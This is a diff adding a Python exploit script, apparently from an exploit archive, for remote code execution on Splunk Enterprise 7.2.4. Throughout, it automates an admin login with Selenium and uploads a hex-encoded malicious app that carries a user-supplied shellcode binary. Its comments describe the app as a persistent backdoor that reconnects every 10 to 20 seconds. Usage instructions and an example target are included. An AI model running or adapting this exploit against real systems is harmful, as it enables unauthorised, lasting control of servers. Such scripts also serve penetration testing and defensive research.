@@ -1,0 +1,150 @@
+#!/usr/bin/python
+
+# Exploit Title: Splunk Enterprise 7.2.4 Custom App RCE (persistent backdoor - custom binary payload)
+# Date: March 1, 2019
+# Exploit Author: Matteo Malvica 
+# Original Author: Lee Mazzoleni
+# Vendor Homepage: https://www.splunk.com/
+# Software Link: https://www.splunk.com/en_us/download/splunk-enterprise.html
+# Version: 7.2.4
+# Tested on: kali 4.18.0-kali2-amd64
+# CVE : n/a
+
+# NOTES: Due to python interoperability issue on CentOS, I have upgraded the exploit to
+# support any kind of binary or payload so the exploit does not have to rely on any python libraries
+
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from time import sleep
+from sys import stdout,argv
+from os import getcwd,path,system
+from subprocess import Popen
+import os
+import stat
+import binascii
+
+# Download and unpack the correct version for your OS from here: github.com/mozilla/geckodriver/releases
+gecko_driver_path = '/root/Desktop/geckodriver'
+
+def checkLogin(url):
+	if '/login' not in url and '/logout' not in url:
+		print 'Login successful!'
+	else:
+		print 'Login failed! Aborting...'
+		exit()
+
+
+def checkUrl(url):
+	if '_upload' not in url:
+		print '[-] Navigation error, aborting...'
+		exit()
+
+
+def exploit(splunk_target_url, splunk_admin_user, splunk_admin_pass):
+	print '[+] Starting bot ...'
+	profile = webdriver.FirefoxProfile()
+	profile.accept_untrusted_certs = True
+	driver = webdriver.Firefox(firefox_profile=profile, executable_path=gecko_driver_path)
+
+	print '[*] Loading the target page ...'
+	driver.get(splunk_target_url)
+	sleep(1)
+
+	stdout.write('[*] Attempting to log in with the provided credentials ... ')
+	username_field = driver.find_element_by_name("username")
+	username_field.clear()
+	username_field.send_keys(splunk_admin_user)
+	sleep(1)
+
+	pw_field = driver.find_element_by_name("password")
+	pw_field.clear()
+	pw_field.send_keys(splunk_admin_pass)
+	pw_field.send_keys(Keys.RETURN)
+	sleep(3)
+
+	current_url = driver.current_url
+	checkLogin(current_url)
+
+	url = driver.current_url.split('/')
+	upload_url = url[0] + '//' + str(url[2]) + '/' + url[3] + '/manager/appinstall/_upload'
+	print '[*] Navigating to the uploads page ({}) ...'.format(upload_url)
+	driver.get(upload_url)
+	sleep(1)
+
+	current_url = driver.current_url
+	checkUrl(current_url)
+
+	form = driver.find_element_by_tag_name("form")
+	input = form.find_element_by_id("appfile")
+	input.send_keys(getcwd()+'/'+'splunk-shell.tar.gz')
+	force_update = driver.find_element_by_id("force")
+	force_update.click()
+	submit_button = driver.find_element_by_class_name("splButton-primary")
+	submit_button.click()
+
+	print '[*] Your persistent shell has been successfully uploaded!'
+	print '[*] Be patient, this might take up to a minute...!'
+	driver.quit()
+
+
+def generatePayload(shellcode):
+	# this hex decodes into the evil splunk app (tar.gz file) that we will be uploading as the payload
+	# after the app is written to disk, together with the provided custom shellcode.
+	# the app configuration sets it to be enabled upon installation (restarting splunk / manually enabling it is not required.)
+	# this is a PERSISTENT backdoor, there is no need to re-upload multiple times... the backdoor will reconnect every 10-20 seconds
+
+	# CHANGED: the compressed app folder structure is loading a custom binary from inputs.conf
+	print '[*] Creating Splunk App...'
+	shell = '1f8b0800e229795c0003ed9c5b6fdbc81580a95c363283b65ea068b7401f06711749dc58e24da4ad34ad9dc44183a6dd20f2260b288a322247126b8a6449cab2374d11f407f4bddbd75efe47db97bef5adfd237def197264eb6ad95959c93ae703a42139c3b99d396766c8e1c4a1d7f577d7e236f3bca27436288a62954a2475cdcc553423730544d50dddd434c3d44ca2a8866ae812299d517e86e8c6098d202b1d9a242c981e0e82359bc7c423ca71e87e438807e55fa817ee57ea952488d83cd380fa300d63bafc556b40fea606f2371543958832cf4c4ce30397bf74f97b57a40b92f44b6a93cf2ae40b22e0d7a425f869f07b003f7ebecf6fe887d85c9e16e5d6cece1371b8dfbf0b793f19d6ffb3d0fe59faaf1a8a628ce87fc9d44aa8ff0b2277b7eba892c4d5392f65ee257972d0bcf88d7141b81ff1f8781c71d8f082069cfdab11ce3dc70882cc1baebb17a586e44a7ea337a8bf9e1b278af29fdc858b972e7f74259f97f3f2b7e45aa51df42a094dbaf15d1a55f9d9639ab41be2782708bcc363da78eab25e7df9bbf7023fa1aecfa2f466d76110e4f933d77782dedda0eb3b7175c0239f5fca2fd5973f79f54a2f29b788baa1bdbe455e59161c435ff1faf552fefb9faa771ebeec1c7cf9eab7af7ff7c7ac14b99c28ce77468af7d551f1f62a91ef057e4b4a8d95744572242635252a75254f4ace6be1478a39520997e15a20d9e0eb0d54c0fffa15f0df7e052cc95797ae7efbead27015d4977f2832fecc7592f60ef3b73db6c7fccfa247346173ab95c19aceaf6c36ff9d166e564de57f70fdc19317dddfffe1ab3ffdf92f7ffddbdfff3152591f8f54d63f87ab63a4a2ce25a260f9abef361b0882bc8770fb4084bb29dc37999b13fe17847b69e09e65e112e16e0af74de6e644b80bc2bd24dcbc7097854b84bb29dc37992b8c564e4c3e7222e59c98a1e4c4038a1c11eee6a98a8c201f0c17336799f7ffdbd3e7ff08829c637297ee57eedf95a6cf74785f4be0f7b27f8334792020c2f2aef813e9282c11eea670df642e0e0410044116cdd0fbbf86eb9fc51a90d3acffb00c85afffb05405d77f2c8221f93bac49bb5e32ef367042f96b9a6a6a4a89cbbf542a6928ff4530247f2fb0e919ac02e37217557352f96b8a89f25f0423f26fc567d001bc85fe2b16eaff4218923f0dc398457b2c9a6f2338bdfc4d552fa1fc17c190fc3b2ca10e4de89c6dc05be8bf85f67f314c967f3a1028f0d379a401f5611ed7ff5b9a35227fcb344c5cffb708aa60f38bae0fa503f90bb71e07ddc86675bbcdecddb8dba9c9d025c46ee0933bc42a68055dee044ee276189cab25a3b4a199d6ba52009d35d761a0a7c8f250acf09fb013c56115f40d5dd7b42c8e9a4c6d9bc53184881875489954c92aa9dd22bdc84d58ff5466fb61102510283e8813d6999dce7a492f6c94544b578ff2da75676710caa7140c553537cca31b3ddaf5a19ea29a1cf47c164160ea745cffa491e99abe7e145948ed5dda62c5b4e2ebcd20aa7743d047169f3873869295eac4f29facff622238270b0019328e5bffafebfab0fe6b60012cd4ff4570522d93ab611484713166bed3a1ae571c57bcbe02f84123700e64796565853c7db8fdacb2b3b5b35d2913be1e0c3ca30ef54817c6993189db41d773488311daf018490262431e20d5b84d23e6903d97f552eb1143fa472727ccf2bbaeda6f0453c6ffbca25d7b4ee3c0d38fff2c433370fcb7088e973f5cf05c1b0e03bf60c7f15ba631c3feeb9aa18dd87fcd3014b4ff8ba0b84aeeb5a9df02ebdb06331c86c40b5a0181110d2b1012b324bdde666eab9d147b7c6d2f81710939801122713b3058b945684c7ad07ab8cbc38614c28029e7c76908b25a940b10f3231ef12b997f3b96c55726861eeedf26e9a534ee325957e04a7aa10183a156c49700974937f26ef4dba4db6915e35d185c1e3eaeceda709d67bcdef0e0b642e8b76e4257b316b110fa13024d2a8bb3fe75226db9cdb1485fcb32d4e04e37f2090cce7891c5fd240c6297eb8debb748d04cbdae55d238c9e3a007d5eb5c1baa6a5e49599ac27ba0ba8aabab72f6d1dd2af9dcb7834e87f999609a81e7053d9e86e7fa2c26377a2ed4fe75c785a8e8c175c23b6d16252e8b6f72994087db4bef4b53e66966d113714399ac75822fd75c9fc7b6067563ef661577e82fbc1a3043dcbdcd2318cb609aef341bbd36ef8e13b69f1c7a9235d21d2c400cfebd805c3f92cb609e89dbe42dedba03a5db85d649862b302bc5485203851a103697f5b599c20eb37833a1a751f296746d50eab11d419573e19324a27e1cc240c54fc65bd75b2708adec240942317911b92e3edc3607bcec03ee05c8877f93a59336ea61e99cbd70e6269d433d5f94740e6dc0bca5236ca1a6f70d5f87462dd75f4b82b0ac1e5ecccca359e2e799d191bb5c3e6d37e68a2df433d56d9fc2bc50981c30bb852c64aab6595afc06eafc1a7a3e423db7e5a7f24e25c54b5a00c1ca6e735254041273fd430372abdf410ce5a10cd5e3b3db503a61f77f0e6374163d8be010e6076d5518353bf082a8bc62e9b45412e679208fa26f80b2beeb1ef27c33fefe87cfeee0608e69cc9aff2b8a3afafcdfd0f0f9df4240f5fab099aaff05756e69bc85fe974cfcfe7f21a0fe7fd84c58ffc3c78c76e01fd7d84fc7acf77fa0fba3fa6feaa8ff0ba12aded2d5e4f4d93ab94398cf1fc63bb25ce52fc5dcb8bee7c62e7f3c7f87a870f1e885975c15efab6af2d80bab34f0bb2e1b329b89eb3fe76c0166e9bf668deabfa55a06eaff22588169f753f16e592d2805455ee93fc8e1137ede0adc56374a5f0190a6eb3150fb31930133ffcc664c59400041b4f5e686696ea84c5159c3341c47b7b566c3b42d4a9beb8a61db25bb411bdac624b3d3a45ecc648f3698c7df36f2a6ba069943fb320726eabfeb3b6c9fc5f3b201b3c6ff9a35f6fe1f0c06eaff2218d3ff0218807be95bf8985012d34e083a983688f471a6b8c05789146479a59a9dd7e49576d0617c671688ef0ef951e5f1a3cf7ff58bfafdbbc52c40d169c82b76e039c704e1de3c58d2a63d96059c142cf38680efbaeace0513f53f5dea31bf11c02cfd57cdd1f9bf5542fd5f0c83fa9fad2c039d166b7c40ab1f3cdc7e747febd1c3adca5a276eb90e686407feb72a243d9557b6bfd879b2756f67ed37a95fffceea8be7b5daeaf35af979fce31b3ffb0978feb4faa25c5bbd5946ad7dbf98d2ff87dd647e0660b6fe5b47fb7f96f8fe9f9665e2febf0b61d2f8ffb0fbf749da122674fcd5d88edc3029178b85f4ab51b6c7cd457f1e00964081b940c2a23dea115591b3f9407210a6c3f9ae8f56e07d61ecfbdf33d8035c39c5fedfd9f7bfa6a9e0fbbfc580fb7f7fd08cebfffcf7003f5eff87f7ff16faaff3ef3f51ff17c284fdbfa54f27079db9ff771a9f88034110044190f71bdcff1b419069e0fedf08727e19d9ff7bdafc1f419073ccccfdbff9f59703c76fa4e98300dcff1b41100441100441100441100441100441100441100441100441100441ce86ff0365f75f'
+	bytes = shell.decode('hex')
+	f = open('splunk-shell.tar.gz','wb')
+	f.write(bytes)
+	f.close()
+
+	if shellcode == "evil":
+		print "shellcode filename needs to be different - please change it"
+		exit()
+
+	print '\t==> Adding custom shellcode'
+	# custom shellcode loading
+	with open(shellcode, "rb") as binaryfile :
+	   	evil_bytes = bytearray(binaryfile.read())
+	f = open('evil','w')
+	f.write(evil_bytes)
+	f.close()
+	st = os.stat('evil')
+	# making the binary executable
+	os.chmod('evil', st.st_mode | stat.S_IEXEC)
+	decompress_cmd = 'tar zxvf splunk-shell.tar.gz &>/dev/null; rm splunk-shell.tar.gz'
+	p = Popen(decompress_cmd, shell=True, executable='/bin/bash')
+	p.wait()
+	move_cmd = 'cp evil splunk-shell/bin/'
+	p = Popen(move_cmd, shell=True, executable='/bin/bash')
+	p.wait()
+	compress_cmd = 'tar zcvf splunk-shell.tar.gz splunk-shell/ &>/dev/null; rm -r splunk-shell/'
+	p = Popen(compress_cmd, shell=True, executable='/bin/bash')
+	p.wait()
+	if path.isfile('splunk-shell.tar.gz'):
+		print '\t==> Payload Ready! (splunk-shell.tar.gz)'
+
+def showUsage():
+	print '\n\tScript Usage: {} <targetUrl> <username> <password> <shellcode>'.format(argv[0])
+        print '\tExample: {} http://192.168.4.16:8000 admin changeme shellcode.bin\n'.format(argv[0])
+
+if len(argv) != 5:
+	showUsage()
+	exit()
+
+if not path.isfile(gecko_driver_path):
+	print '\n\t[!] This program requires geckodriver, download the corresponding version for your OS from the following link:'
+	print '\t\t==> https://github.com/mozilla/geckodriver/releases'
+	print '\n\t[!] Extract the geckodriver binary, then add its full path to line 20 of this script.'
+	print '\t\t==> gecko_driver_path = "/tmp/geckodriver"\n'
+	exit()
+
+splunk_target_url = argv[1]
+splunk_admin_user = argv[2]
+splunk_admin_pass = argv[3]
+splunk_shellcode  = argv[4]
+generatePayload(splunk_shellcode)
+exploit(splunk_target_url, splunk_admin_user, splunk_admin_pass)
